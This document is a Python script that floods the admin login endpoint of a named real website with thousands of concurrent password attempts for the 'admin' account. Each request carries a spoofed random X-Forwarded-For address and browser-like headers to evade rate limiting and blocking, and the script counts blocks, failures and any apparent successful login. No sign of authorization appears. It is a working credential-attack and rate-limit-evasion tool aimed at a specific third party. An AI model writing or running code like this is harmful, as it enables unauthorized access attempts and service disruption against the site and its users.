import json, random, sys, urllib.request, urllib.error, time
from collections import Counter
import concurrent.futures

TARGET = "https://www.kufaka.com/adminApi/auth/login"
N = int(sys.argv[1]) if len(sys.argv) > 1 else 2000
CONC = int(sys.argv[2]) if len(sys.argv) > 2 else 16
USER = sys.argv[3] if len(sys.argv) > 3 else "admin"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

def rand_ip():
    return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                            random.randint(0, 255), random.randint(1, 254))

def one(i):
    body = json.dumps({"username": USER, "password": "Zx%d!q%s" % (random.randint(0, 10**9), i)}).encode()
    req = urllib.request.Request(TARGET, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("X-Forwarded-For", rand_ip())
    req.add_header("User-Agent", UA)
    req.add_header("Referer", "https://www.kufaka.com/package/admin/")
    req.add_header("Origin", "https://www.kufaka.com")
    req.add_header("Accept", "application/json, text/plain, */*")
    try:
        r = urllib.request.urlopen(req, timeout=25)
        return (r.status, r.read().decode("utf-8", "ignore")[:200])
    except urllib.error.HTTPError as e:
        return (e.code, e.read().decode("utf-8", "ignore")[:160])
    except Exception as e:
        return (0, "ERR:%s" % type(e).__name__)

t0 = time.time()
c = Counter()
samples = {}
with concurrent.futures.ThreadPoolExecutor(max_workers=CONC) as ex:
    for st, txt in ex.map(one, range(N)):
        if st in (403, 429):
            key = str(st)
        elif "用户名或密码不正确" in txt:
            key = "MISS"
        elif st == 200:
            key = "OK?"
        else:
            key = str(st)
        c[key] += 1
        samples.setdefault(key, txt[:160])
        if key == "OK?":
            print("OK", txt)
dt = time.time() - t0
print("RATE n=%d conc=%d %.1fs rate=%.1f/s %s" % (N, CONC, dt, N / max(dt, .01), dict(c)))
for k, v in samples.items():
    print("sample", k, "->", v)
